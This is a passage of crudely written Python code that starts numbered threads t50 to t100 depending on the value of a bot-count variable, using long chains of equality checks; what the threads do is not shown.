if botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t50.start()
if botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t51.start()
if botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t52.start()
if botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t53.start()
if botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t54.start()
if botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t55.start()
if botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t56.start()
if botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t57.start()
if botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t58.start()
if botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t59.start()
if botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t60.start()
if botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t61.start()
if botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t62.start()
if botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t63.start()
if botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t64.start()
if botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t65.start()
if botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t66.start()
if botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t67.start()
if botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t68.start()
if botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t69.start()
if botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t70.start()
if botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t71.start()
if botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t72.start()
if botsay==73 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t73.start()
if botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t74.start()
if botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t75.start()
if botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t76.start()
if botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t77.start()
if botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t78.start()
if botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t79.start()
if botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t80.start()
if botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t81.start()
if botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t82.start()
if botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t83.start()
if botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t84.start()
if botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t85.start()
if botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t86.start()
if botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t87.start()
if botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t88.start()
if botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t89.start()
if botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t90.start()
if botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t91.start()
if botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t92.start()
if botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t93.start()
if botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t94.start()
if botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t95.start()
if botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t96.start()
if botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t97.start()
if botsay==98 or botsay==99 or botsay==100 :
    t98.start()
if botsay==99 or botsay==100 :
    t99.start()
if botsay==100 :
    t100.start()    